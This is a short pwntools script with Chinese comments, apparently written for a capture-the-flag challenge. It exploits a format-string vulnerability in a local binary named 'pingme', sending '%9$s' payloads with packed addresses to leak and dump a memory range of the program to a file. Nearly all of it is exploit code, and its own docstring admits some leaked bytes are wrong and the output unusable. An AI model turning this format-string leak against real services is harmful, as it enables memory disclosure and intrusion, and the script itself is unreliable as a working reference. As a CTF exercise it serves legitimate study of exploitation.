#!/usr/bin/python
# -*- coding: UTF-8 -*-

'''dump 二进制文件
todo 部分字节错误 无法使用'''
from pwn import *

def dunmp_memory(start_addr,end_addr):
    result = b''
    while start_addr < end_addr:
        #io = remote('127.0.0.1','10001')
        io = process('./pingme')
        io.recvline()

        ''' 通过fmtstr 得出格式化字符串漏洞 arg7存放变量的位置  这边将payload放后
            然后这边.AAA 和 地址占用两个字节 所以读取的应该是index 9的arg才是start_addr处的内容
            地址后置也是为了防止printf的%s被地址中的\x00截断?
        '''
        payload = b"%9$s.AAA"+p32(start_addr)
        io.sendline(payload)
        data = io.recvuntil(".AAA")[:-4]
        if data == b'':
            data = b'\x00'
        if data == b'(null)':
            data = b'\x00\x00\x00\x00\x00\x00'
        log.info("leaking:0x%x-->%s"%(start_addr,data))
        result += data
        start_addr += len(data)
        io.close()
    return result
start_addr = 0x8048000  # 32bit linux elf 虚拟地址默认这个开始
end_addr = 0x8049000   # 0x1000B差不多

code_bin = dunmp_memory(start_addr,end_addr)
with open("code.bin","wb") as f:
    f.write(code_bin)
    f.close()